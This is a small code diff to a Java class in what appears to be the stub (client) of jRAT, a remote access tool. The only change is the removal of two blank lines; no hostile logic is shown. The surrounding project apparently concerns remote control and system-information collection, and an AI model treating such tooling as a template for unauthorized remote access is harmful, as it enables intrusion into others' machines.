@@ -5,8 +5,6 @@ import java.util.Set;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet44SystemJavaProperty;
 
-
-
 public class Packet61SystemJavaProperties extends AbstractIncomingPacket {
 
 	@Override
